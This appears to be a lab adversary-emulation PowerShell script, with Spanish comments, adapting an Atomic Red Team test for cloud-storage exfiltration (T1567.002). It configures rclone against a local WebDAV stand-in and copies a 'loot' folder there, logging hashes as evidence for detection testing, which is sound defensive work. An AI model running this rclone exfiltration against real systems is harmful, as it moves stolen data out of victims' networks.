# ATA058 - T1567.002 Exfiltration to Cloud Storage (Windows)
# ART adaptado: atomic T1567.002 "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
# guid 8529ee44-279a-4a19-80bf-b846a40dda58.
# Adaptacion: el remote `mega` se sustituye por un WebDAV local (nube.local:9092) y el
# binario rclone viene pre-staged en C:\lab-attack\_tools\rclone.exe (fuera del repo).
# Se conserva el mecanismo: rclone.exe copia un directorio a un almacenamiento remoto.
$ErrorActionPreference = 'Continue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$rclone = 'C:\lab-attack\_tools\rclone.exe'
$conf = Join-Path $dir 'rclone.conf'
$src = Join-Path $dir 'loot'
$remote = "nube:ATA058/run_" + (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ')
if (-not (Test-Path $rclone)) {
    "ERROR: falta $rclone (pre-staging)" | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 3
}

$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')

# --- comando ART (8529ee44), remote Mega -> WebDAV local ---
@"
[nube]
type = webdav
url = http://192.168.65.1:9092/
vendor = other
"@ | Set-Content -Path $conf -Encoding ascii
& $rclone copy --max-size 1700k $src $remote --config $conf -v *>> (Join-Path $ev 'rclone.out')
$rc = $LASTEXITCODE
# --- fin comando ART ---

$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$hashes = @()
Get-ChildItem $src -File | ForEach-Object {
    $h = (Get-FileHash $_.FullName -Algorithm SHA256).Hash.ToLower()
    $hashes += ("{0}={1}" -f $_.Name, $h)
}
@(
    "ata=ATA058",
    "tecnica=T1567.002",
    "fuente=ART_adaptado",
    "guid=8529ee44-279a-4a19-80bf-b846a40dda58",
    "t0=$t0",
    "t1=$t1",
    "remote=$remote",
    "rclone_rc=$rc"
) + ($hashes | ForEach-Object { "sha256_local_$_" }) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
@("t0=$t0", "t1=$t1") | Out-File -FilePath (Join-Path $ev 'times.log') -Encoding ascii
exit 0
